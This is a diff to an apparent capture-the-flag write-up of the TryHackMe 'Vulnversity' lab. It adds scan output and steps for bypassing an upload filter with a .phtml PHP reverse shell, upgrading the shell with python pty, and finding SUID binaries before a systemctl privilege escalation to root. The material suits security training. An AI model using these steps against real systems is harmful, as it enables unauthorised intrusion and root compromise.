@@ -1,8 +1,62 @@
 
 #Vulnversity
+#TryHackMe
+#Vulnversity
 
-Used this to list SUID
-find / -user root -perm -4000 -exec ls -ldb {} \;
+
+Let's scan for services:
+
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 21:04 EDT
+	Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+	SYN Stealth Scan Timing: About 31.83% done; ETC: 21:05 (0:00:06 remaining)
+	Nmap scan report for 10.10.31.99
+	Host is up (0.20s latency).
+	Not shown: 994 closed ports
+	PORT     STATE SERVICE     VERSION
+	21/tcp   open  ftp         vsftpd 3.0.3
+	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	3128/tcp open  http-proxy  Squid http proxy 3.5.12
+	3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	TCP/IP fingerprint:
+	OS:SCAN(V=7.80%E=4%D=6/24%OT=21%CT=1%CU=30045%PV=Y%DS=4%DC=I%G=Y%TM=5EF3F86
+	OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=RD%II=I%TS=8)OP
+	OS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST
+	OS:11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+	OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+	OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+	OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+	OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+	OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+	OS:D=S)
+
+	Network Distance: 4 hops
+	Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds
+
+We find several services open, one of them is an Apache web server.
+
+We can scan for directories using gobuster or dirsearch
+
+	gobuster dir -u http://<ip>:3333 -w /home/kali/tools/SecLists/Discovery/Web-Content/common.txt
+
+We find a directory called /internal/
+
+If we navigate there we will find an upload page. We bruteforce requests with burp to find an extension the page won't block. (list.txt)
+
+We find that phtml won't be blocked, so we upload a php reverse shell (php-reverse-shell.phtml)
+
+We get a shell on the server and spawn a proper shell using python
+
+	python -c 'import pty; pty.spawn("/bin/bash")'
+
+Once we are in the server, we look for files we can access. I Used this to list SUID
+	
+	find / -user root -perm -4000 -exec ls -ldb {} \;
 
 We get the following info.
 
@@ -43,6 +97,8 @@ Then we run the following commands
 
 We get a connection on port 9999 with root privileges.
 
-That was a nice way to privesc leveraging misconfigurations. 
+We finally get the flag.
+
+That was a nice way to privesc leveraging misconfiguration. 
 
 Source: https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
